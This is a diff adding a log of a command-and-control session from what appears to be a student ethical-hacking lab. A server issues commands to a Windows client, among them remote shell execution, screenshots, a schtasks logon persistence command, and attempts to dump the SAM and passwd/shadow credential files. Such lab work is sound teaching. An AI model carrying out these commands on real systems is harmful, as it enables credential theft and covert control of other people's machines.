@@ -1,0 +1,80 @@
+2025-11-09 06:10:26 - === NOUVELLE SESSION ===
+2025-11-09 06:10:26 - Client: DESKTOP-9GEI226 (Windows)
+2025-11-09 06:10:26 - IP: ('192.168.100.1', 55425)
+
+2025-11-09 06:10:26 - 
+>>> Commande envoyée: whoami (ID: 1)
+2025-11-09 06:10:26 - <<< Réponse (Status: ok):
+2025-11-09 06:10:26 - nicol
+2025-11-09 06:10:26 - --------------------------------------------------------------------------------
+2025-11-09 06:10:27 - 
+>>> Commande envoyée: get_ips (ID: 2)
+2025-11-09 06:10:27 - <<< Réponse (Status: ok):
+2025-11-09 06:10:27 - vEthernet (WSL (Hyper-V firewall)):172.24.192.1
+vEthernet (WSL (Hyper-V firewall)):fe80::69ab:b751:725b:710a
+Ethernet 2:192.168.56.1
+Ethernet 2:fe80::1b97:ec65:cdcf:6f56
+Ethernet 3:192.168.100.1
+Ethernet 3:fe80::2e9c:3e53:b492:bdff
+McAfee VPN:10.21.40.69
+McAfee VPN:fe80::7bed:9bdd:4aa1:2b51
+Wi-Fi 2:169.254.30.71
+Wi-Fi 2:fe80::77f0:266f:2eba:73b1
+Wi-Fi 3:169.254.93.241
+Wi-Fi 3:fe80::d417:d0ff:6d36:c439
+Wi-Fi:10.98.1.222
+Wi-Fi:2001:861:5e40:1c2:11cc:a168:df83:fbce
+Wi-Fi:2001:861:5e40:1c2:6058:a5c:ce3:434
+Wi-Fi:fe80::7c7:150d:99d2:78fa
+Bluetooth Network Connection:169.254.20.195
+Bluetooth Network Connection:fe80::642e:9fa6:6400:2683
+Ethernet:169.254.156.191
+Ethernet:fe80::b913:55b6:49f6:8a3e
+OpenVPN Wintun:169.254.249.71
+OpenVPN Wintun:fe80::6616:dbb4:e484:347
+OpenVPN Data Channel Offload:169.254.39.129
+OpenVPN Data Channel Offload:fe80::6616:dbb4:e484:347
+Loopback Pseudo-Interface 1:::1
+2025-11-09 06:10:27 - --------------------------------------------------------------------------------
+2025-11-09 06:10:27 - 
+>>> Commande envoyée: list (ID: 3)
+2025-11-09 06:10:27 -     Arguments: {'path': '/home', 'max_depth': 1}
+2025-11-09 06:10:27 - <<< Réponse (Status: ok):
+2025-11-09 06:10:27 - (empty)
+2025-11-09 06:10:27 - --------------------------------------------------------------------------------
+2025-11-09 06:10:28 - 
+>>> Commande envoyée: uptime (ID: 4)
+2025-11-09 06:10:28 - <<< Réponse (Status: ok):
+2025-11-09 06:10:28 - (uptime not available on this platform)
+2025-11-09 06:10:28 - --------------------------------------------------------------------------------
+2025-11-09 06:10:28 - 
+>>> Commande envoyée: screenshot (ID: 5)
+2025-11-09 06:10:28 - <<< Réponse (Status: ok):
+2025-11-09 06:10:28 - screenshot saved to C:\Users\nicol\OneDrive - DVHE\BIN A3 CYBER\Ethical Hacking\tp-python-EH\screens\screenshot.png
+2025-11-09 06:10:28 - --------------------------------------------------------------------------------
+2025-11-09 06:10:29 - 
+>>> Commande envoyée: run_shell (ID: 6)
+2025-11-09 06:10:29 -     Arguments: {'command': 'echo hello from server'}
+2025-11-09 06:10:29 - <<< Réponse (Status: ok):
+2025-11-09 06:10:29 - hello from server
+2025-11-09 06:10:29 - --------------------------------------------------------------------------------
+2025-11-09 06:10:29 - 
+>>> Commande envoyée: setup_autostart (ID: 7)
+2025-11-09 06:10:29 - <<< Réponse (Status: ok):
+2025-11-09 06:10:29 - Run this as admin in Windows to enable autostart:
+schtasks /Create /SC ONLOGON /TN "WSAgentDemo" /TR "C:\Users\nicol\AppData\Local\Microsoft\WindowsApps\PythonSoftwareFoundation.Python.3.13_qbz5n2kfra8p0\python.exe C:\Users\nicol\OneDrive - DVHE\BIN A3 CYBER\Ethical Hacking\tp-python-EH\Client.py"
+2025-11-09 06:10:29 - --------------------------------------------------------------------------------
+2025-11-09 06:10:30 - 
+>>> Commande envoyée: get_simulated_sensitive (ID: 8)
+2025-11-09 06:10:30 - <<< Réponse (Status: ok):
+2025-11-09 06:10:30 - Simulated sensitive data: DEMO_PASSWORD_12345
+2025-11-09 06:10:30 - --------------------------------------------------------------------------------
+2025-11-09 06:10:30 - 
+>>> Commande envoyée: get_sam (ID: 9)
+2025-11-09 06:10:45 - <<< TIMEOUT pour la commande get_sam
+2025-11-09 06:10:46 - 
+>>> Commande envoyée: add_registry (ID: 10)
+2025-11-09 06:10:46 -     Arguments: {'key_path': 'HKEY_CURRENT_USER\\Software\\TestKey', 'value_name': 'TestValue', 'value_data': 'HelloFromServer', 'value_type': 'REG_SZ'}
+2025-11-09 06:11:01 - <<< TIMEOUT pour la commande add_registry
+2025-11-09 06:11:01 - 
+>>> Commande envoyée: get_passwd_shadow (ID: 11)
